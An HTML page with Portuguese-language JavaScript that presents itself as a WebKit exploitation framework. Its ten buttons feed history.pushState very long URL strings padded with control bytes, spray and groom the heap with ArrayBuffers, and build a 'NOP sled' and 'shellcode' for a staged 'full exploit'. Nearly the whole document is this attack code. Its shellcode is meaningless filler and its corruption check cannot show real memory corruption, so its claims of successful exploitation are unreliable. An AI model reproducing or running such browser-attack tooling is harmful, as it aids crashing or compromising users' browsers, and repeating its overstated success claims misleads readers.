<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit Byte-Range Exploitation</title>
</head>
<body>

<h1>WebKit Byte-Range Exploitation (0x00-0x20)</h1>

<h2>DESCOBERTA CRÍTICA</h2>
<p><strong>Posição 709523+:</strong> Aceita apenas bytes 0x00 a 0x20</p>
<p><strong>Bytes acima de 0x20:</strong> Causam crash imediato</p>

<hr>

<h2>Teste 1: Mapear Bytes Permitidos</h2>
<p>Testa cada byte de 0x00 a 0xFF para confirmar quais passam</p>
<button onclick="test1_MapBytes()">Executar Teste 1</button>

<hr>

<h2>Teste 2: Explorar Bytes de Controle (0x00-0x20)</h2>
<p>Usa apenas bytes permitidos para criar payload controlado</p>
<label>Tamanho do payload:</label>
<input type="number" id="t2size" value="10000" min="100" max="100000">
<button onclick="test2_ControlBytes()">Executar Teste 2</button>

<hr>

<h2>Teste 3: Sequências Específicas</h2>
<p>Testa sequências de bytes de controle com significado especial</p>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<hr>

<h2>Teste 4: Shellcode com Bytes Limitados</h2>
<p>Constrói shellcode usando apenas 0x00-0x20</p>
<label>Tamanho shellcode:</label>
<input type="number" id="t4size" value="1000" min="100" max="50000">
<button onclick="test4_LimitedShellcode()">Executar Teste 4</button>

<hr>

<h2>Teste 5: Padding e Alinhamento</h2>
<p>Usa bytes permitidos para controlar alinhamento de memória</p>
<label>Alignment (bytes):</label>
<input type="number" id="t5align" value="8" min="1" max="64">
<button onclick="test5_Alignment()">Executar Teste 5</button>

<hr>

<h2>Teste 6: Exploração Incremental</h2>
<p>Aumenta gradualmente tamanho usando apenas bytes válidos</p>
<label>Start:</label>
<input type="number" id="t6start" value="1000" min="100" max="50000">
<label>Step:</label>
<input type="number" id="t6step" value="5000" min="100" max="10000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<hr>

<h2>Teste 7: Null-Byte Injection</h2>
<p>Usa 0x00 (null) para tentar terminar strings prematuramente</p>
<label>Posição do null:</label>
<input type="number" id="t7pos" value="5000" min="100" max="50000">
<button onclick="test7_NullInjection()">Executar Teste 7</button>

<hr>

<h2>Teste 8: Whitespace Exploitation</h2>
<p>Usa whitespace (0x09, 0x0A, 0x0D, 0x20) para controle</p>
<button onclick="test8_Whitespace()">Executar Teste 8</button>

<hr>

<h2>Teste 9: Binary Pattern Search</h2>
<p>Busca padrões binários que causam comportamento específico</p>
<button onclick="test9_PatternSearch()">Executar Teste 9</button>

<hr>

<h2>Teste 10: Exploitation Completa</h2>
<p>Combina todas as técnicas para exploração total</p>
<button onclick="test10_FullExploit()">Executar Teste 10</button>

<hr>

<button onclick="clearLog()">Limpar Log</button>

<hr>

<div id="log"></div>

<script>
// ===================================================================
// CONSTANTES BASEADAS NA DESCOBERTA
// ===================================================================
const BASE_SAFE = 709522;
const OVERFLOW_START = 709523;
const MIN_ALLOWED_BYTE = 0x00;
const MAX_ALLOWED_BYTE = 0x20;

// Objetos de controle
let heapObjects = [];
let targetObjects = [];

// ===================================================================
// LOGGING
// ===================================================================
function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    log('Log limpo');
}

// ===================================================================
// PREPARAÇÃO DE HEAP
// ===================================================================
function prepareHeap() {
    log('Preparando heap...');
    
    heapObjects = [];
    targetObjects = [];
    
    // Spray
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    // Holes
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    // Alvos
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    log('Heap preparado: 500 spray + 50 alvos');
}

function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            if (t.magic !== 0xCAFEBABE) {
                log(`CORRUPTED alvo ${i}: magic=0x${t.magic.toString(16)}`);
                corrupted++;
            }
            if (t.view[0] !== 0xDEADBEEF) {
                log(`CORRUPTED alvo ${i}: buffer=0x${t.view[0].toString(16)}`);
                corrupted++;
            }
        } catch (e) {
            log(`DESTROYED alvo ${i}`);
            corrupted++;
        }
    }
    return corrupted;
}

// ===================================================================
// TESTE 1: MAPEAR BYTES PERMITIDOS
// ===================================================================
function test1_MapBytes() {
    log('================================');
    log('TESTE 1: MAPEAMENTO DE BYTES');
    log('================================');
    
    prepareHeap();
    
    log('Testando cada byte de 0x00 a 0xFF...');
    
    const allowedBytes = [];
    const crashBytes = [];
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            allowedBytes.push(byte);
            
            if (byte % 16 === 0) {
                log(`Testando 0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
            log(`CRASH em 0x${byte.toString(16).padStart(2, '0')}: ${e.message}`);
        }
    }
    
    log('');
    log('=== RESULTADO ===');
    log(`Bytes permitidos: ${allowedBytes.length}`);
    log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
    log(`Lista: [${allowedBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    log('');
    log(`Bytes que crasham: ${crashBytes.length}`);
    if (crashBytes.length < 50) {
        log(`Lista: [${crashBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    }
}

// ===================================================================
// TESTE 2: EXPLORAR BYTES DE CONTROLE
// ===================================================================
function test2_ControlBytes() {
    log('================================');
    log('TESTE 2: BYTES DE CONTROLE');
    log('================================');
    
    prepareHeap();
    
    const size = parseInt(document.getElementById('t2size').value);
    log(`Criando payload de ${size} bytes usando apenas 0x00-0x20`);
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // Criar padrão com bytes permitidos
        let overflow = "";
        for (let i = 0; i < size; i++) {
            // Alternar entre diferentes bytes de controle
            const byte = (i % 33); // 0x00 a 0x20
            overflow += String.fromCharCode(byte);
        }
        
        const payload = "/" + base + overflow;
        
        log(`Payload: ${BASE_SAFE} + ${size} = ${payload.length} bytes`);
        log('Executando...');
        
        history.pushState({}, "control", payload);
        
        log('SUCESSO! Payload executado sem crash');
        
        setTimeout(() => {
            const corrupted = checkCorruption();
            if (corrupted > 0) {
                log(`EXPLORAÇÃO SUCESSO! ${corrupted} alvos corrompidos`);
            } else {
                log('Sem corrupção detectada');
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE 3: SEQUÊNCIAS ESPECIAIS
// ===================================================================
function test3_SpecialSequences() {
    log('================================');
    log('TESTE 3: SEQUÊNCIAS ESPECIAIS');
    log('================================');
    
    prepareHeap();
    
    // Sequências com significado especial
    const sequences = [
        { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];
    
    for (let seq of sequences) {
        log('');
        log(`Testando: ${seq.name}`);
        log(`Bytes: [${seq.bytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Repetir sequência 1000 vezes
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
            
            log(`SUCESSO: ${seq.name} executado`);
            
        } catch (e) {
            log(`CRASH: ${seq.name} - ${e.message}`);
        }
    }
    
    setTimeout(() => {
        log('');
        log('Verificando corrupção...');
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`RESULTADO: ${corrupted} alvos corrompidos por sequências especiais`);
        }
    }, 2000);
}

// ===================================================================
// TESTE 4: SHELLCODE LIMITADO
// ===================================================================
function test4_LimitedShellcode() {
    log('================================');
    log('TESTE 4: SHELLCODE COM BYTES LIMITADOS');
    log('================================');
    
    prepareHeap();
    
    const size = parseInt(document.getElementById('t4size').value);
    
    log('Construindo shellcode usando apenas 0x00-0x20...');
    
    // Shellcode alphanumeric-like mas com bytes baixos
    // Estrutura típica: NOP sled + payload
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // NOP sled equivalente (usando 0x01)
        const nopSled = "\x01".repeat(Math.floor(size * 0.7));
        
        // "Shellcode" simulado com bytes de controle
        let shellcode = "";
        
        // Simular estrutura de shellcode:
        // 0x00 = terminador
        // 0x0A = newline (pode ser usado para delimitadores)
        // 0x20 = space (pode ser parte de comandos)
        
        for (let i = 0; i < Math.floor(size * 0.3); i++) {
            if (i % 10 === 0) {
                shellcode += "\x00"; // Terminador
            } else if (i % 5 === 0) {
                shellcode += "\x0A"; // Newline
            } else {
                shellcode += String.fromCharCode((i % 21) + 1); // 0x01-0x15
            }
        }
        
        const overflow = nopSled + shellcode;
        const payload = "/" + base + overflow;
        
        log(`NOP sled: ${nopSled.length} bytes`);
        log(`Shellcode: ${shellcode.length} bytes`);
        log(`Total payload: ${payload.length} bytes`);
        log('Executando...');
        
        history.pushState({}, "shellcode", payload);
        
        log('SUCESSO! Shellcode injetado');
        
        setTimeout(() => {
            const corrupted = checkCorruption();
            if (corrupted > 0) {
                log(`SHELLCODE ATIVO! ${corrupted} alvos afetados`);
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE 5: PADDING E ALINHAMENTO
// ===================================================================
function test5_Alignment() {
    log('================================');
    log('TESTE 5: PADDING E ALINHAMENTO');
    log('================================');
    
    prepareHeap();
    
    const alignment = parseInt(document.getElementById('t5align').value);
    
    log(`Testando alinhamento de ${alignment} bytes`);
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // Criar payload alinhado
        let overflow = "";
        
        // Padrão de alinhamento
        for (let i = 0; i < 10000; i++) {
            // Preencher até alinhamento
            const padding = alignment - (i % alignment);
            for (let j = 0; j < padding; j++) {
                overflow += "\x00";
            }
            
            // Byte de marcação
            overflow += "\x01";
        }
        
        const payload = "/" + base + overflow;
        
        log(`Payload com alinhamento: ${payload.length} bytes`);
        log('Executando...');
        
        history.pushState({}, "aligned", payload);
        
        log('SUCESSO! Payload alinhado executado');
        
        setTimeout(() => {
            const corrupted = checkCorruption();
            if (corrupted > 0) {
                log(`ALINHAMENTO EFETIVO! ${corrupted} alvos corrompidos`);
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE 6: EXPLORAÇÃO INCREMENTAL
// ===================================================================
async function test6_Incremental() {
    log('================================');
    log('TESTE 6: EXPLORAÇÃO INCREMENTAL');
    log('================================');
    
    prepareHeap();
    
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    
    log(`Começando em ${start} bytes, incremento de ${step}`);
    
    let currentSize = start;
    let maxSuccess = 0;
    
    for (let i = 0; i < 10; i++) {
        log('');
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Overflow usando apenas bytes válidos
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, `inc_${currentSize}`, payload);
            
            log(`SUCESSO com ${currentSize} bytes`);
            maxSuccess = currentSize;
            
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 1500));
            
        } catch (e) {
            log(`CRASH em ${currentSize} bytes: ${e.message}`);
            break;
        }
    }
    
    log('');
    log('=== RESULTADO ===');
    log(`Tamanho máximo sem crash: ${maxSuccess} bytes`);
    
    setTimeout(() => {
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`EXPLORAÇÃO SUCESSO! ${corrupted} alvos corrompidos`);
        }
    }, 1000);
}

// ===================================================================
// TESTE 7: NULL-BYTE INJECTION
// ===================================================================
function test7_NullInjection() {
    log('================================');
    log('TESTE 7: NULL-BYTE INJECTION');
    log('================================');
    
    prepareHeap();
    
    const nullPos = parseInt(document.getElementById('t7pos').value);
    
    log(`Injetando null byte na posição ${nullPos}`);
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // Payload antes do null
        let before = "";
        for (let i = 0; i < nullPos; i++) {
            before += String.fromCharCode((i % 32) + 1); // 0x01-0x20
        }
        
        // Null byte
        const nullByte = "\x00";
        
        // Payload depois do null (para ver se é processado)
        let after = "";
        for (let i = 0; i < 5000; i++) {
            after += String.fromCharCode((i % 32) + 1);
        }
        
        const overflow = before + nullByte + after;
        const payload = "/" + base + overflow;
        
        log(`Antes do null: ${before.length} bytes`);
        log(`Depois do null: ${after.length} bytes`);
        log(`Total: ${payload.length} bytes`);
        log('Executando...');
        
        history.pushState({}, "null_inject", payload);
        
        log('SUCESSO! Null byte injetado');
        
        setTimeout(() => {
            const corrupted = checkCorruption();
            if (corrupted > 0) {
                log(`NULL INJECTION EFETIVO! ${corrupted} alvos corrompidos`);
                log('String pode ter terminado prematuramente no null byte');
            } else {
                log('Null byte não afetou processamento');
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE 8: WHITESPACE EXPLOITATION
// ===================================================================
function test8_Whitespace() {
    log('================================');
    log('TESTE 8: WHITESPACE EXPLOITATION');
    log('================================');
    
    prepareHeap();
    
    log('Usando caracteres whitespace para controle...');
    
    const whitespaceChars = [
        { name: "Tab", code: 0x09 },
        { name: "Line Feed", code: 0x0A },
        { name: "Vertical Tab", code: 0x0B },
        { name: "Form Feed", code: 0x0C },
        { name: "Carriage Return", code: 0x0D },
        { name: "Space", code: 0x20 }
    ];
    
    try {
        const base = "A".repeat(BASE_SAFE);
        
        // Criar padrão alternando whitespaces
        let overflow = "";
        for (let i = 0; i < 10000; i++) {
            const ws = whitespaceChars[i % whitespaceChars.length];
            overflow += String.fromCharCode(ws.code);
        }
        
        const payload = "/" + base + overflow;
        
        log(`Payload: ${payload.length} bytes de whitespace`);
        log('Executando...');
        
        history.pushState({}, "whitespace", payload);
        
        log('SUCESSO! Whitespace payload executado');
        
        setTimeout(() => {
            const corrupted = checkCorruption();
            if (corrupted > 0) {
                log(`WHITESPACE EFETIVO! ${corrupted} alvos corrompidos`);
            }
        }, 1000);
        
    } catch (e) {
        log(`ERRO: ${e.message}`);
    }
}

// ===================================================================
// TESTE 9: BINARY PATTERN SEARCH
// ===================================================================
function test9_PatternSearch() {
    log('================================');
    log('TESTE 9: BINARY PATTERN SEARCH');
    log('================================');
    
    prepareHeap();
    
    log('Buscando padrões binários interessantes...');
    
    const patterns = [
        { name: "Zeros", gen: () => "\x00" },
        { name: "Ones", gen: () => "\x01" },
        { name: "Alternating 01", gen: () => (Math.random() > 0.5 ? "\x00" : "\x01") },
        { name: "Sequential", gen: (i) => String.fromCharCode(i % 33) },
        { name: "Reverse Sequential", gen: (i) => String.fromCharCode(32 - (i % 33)) },
        { name: "Powers of 2", gen: (i) => String.fromCharCode([1,2,4,8,16,32][i % 6]) }
    ];
    
    for (let pattern of patterns) {
        log('');
        log(`Testando padrão: ${pattern.name}`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            let overflow = "";
            for (let i = 0; i < 10000; i++) {
                overflow += pattern.gen(i);
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, pattern.name.replace(/\s/g, '_'), payload);
            
            log(`SUCESSO: ${pattern.name}`);
            
        } catch (e) {
            log(`CRASH: ${pattern.name} - ${e.message}`);
        }
    }
    
    setTimeout(() => {
        log('');
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`PADRÕES EFETIVOS! ${corrupted} alvos corrompidos`);
        }
    }, 2000);
}

// ===================================================================
// TESTE 10: EXPLORAÇÃO COMPLETA
// ===================================================================
async function test10_FullExploit() {
    log('================================');
    log('TESTE 10: EXPLORAÇÃO COMPLETA');
    log('================================');
    
    clearLog();
    
    log('Executando exploit completo com bytes limitados...');
    log('');
    
    // Preparar heap
    prepareHeap();
    await new Promise(r => setTimeout(r, 1000));
    
    // Stage 1: Pequeno overflow para teste
    log('[STAGE 1] Overflow de teste (5KB)...');
    try {
        const base1 = "A".repeat(BASE_SAFE);
        let overflow1 = "";
        for (let i = 0; i < 5000; i++) {
            overflow1 += String.fromCharCode(i % 33);
        }
        history.pushState({}, "stage1", "/" + base1 + overflow1);
        log('Stage 1 OK');
    } catch (e) {
        log(`Stage 1 FALHOU: ${e.message}`);
        return;
    }
    
    await new Promise(r => setTimeout(r, 2000));
    
    // Stage 2: Overflow com NOPs
    log('[STAGE 2] NOP sled (15KB)...');
    try {
        const base2 = "A".repeat(BASE_SAFE);
        const overflow2 = "\x01".repeat(15000);
        history.pushState({}, "stage2", "/" + base2 + overflow2);
        log('Stage 2 OK');
    } catch (e) {
        log(`Stage 2 FALHOU: ${e.message}`);
        return;
    }
    
    await new Promise(r => setTimeout(r, 2000));
    
    // Stage 3: Payload final
    log('[STAGE 3] Payload final (30KB)...');
    try {
        const base3 = "A".repeat(BASE_SAFE);
        
        // NOP sled
        const nops = "\x01".repeat(20000);
        
        // "Shellcode" com bytes de controle
        let shellcode = "";
        for (let i = 0; i < 10000; i++) {
            if (i % 100 === 0) {
                shellcode += "\x00\x0A\x0D\x20"; // Terminadores/whitespace
            } else {
                shellcode += String.fromCharCode((i % 32) + 1);
            }
        }
        
        const overflow3 = nops + shellcode;
        const payload3 = "/" + base3 + overflow3;
        
        log(`Payload: ${BASE_SAFE} + ${nops.length} (NOPs) + ${shellcode.length} (shellcode)`);
        log('Executando exploit final...');
        
        history.pushState({}, "final", payload3);
        
        log('STAGE 3 OK - EXPLOIT INJETADO!');
        
        setTimeout(() => {
            log('');
            log('=== VERIFICANDO RESULTADO ===');
            const corrupted = checkCorruption();
            
            if (corrupted > 0) {
                log('');
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
                log('EXPLORAÇÃO BEM-SUCEDIDA!!!');
                log(`${corrupted} ALVOS CORROMPIDOS`);
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
            } else {
                log('Exploit executado mas sem corrupção detectada');
                log('Ajuste parâmetros e tente novamente');
            }
        }, 2000);
        
    } catch (e) {
        log(`Stage 3 FALHOU: ${e.message}`);
    }
}

// ===================================================================
// INICIALIZAÇÃO
// ===================================================================
log('WebKit Byte-Range Exploitation Framework');
log('Bytes permitidos: 0x00 - 0x20');
log('Base segura: 709522 bytes');
log('Comece com Teste 1 para confirmar bytes permitidos');
</script>

</body>
</html>
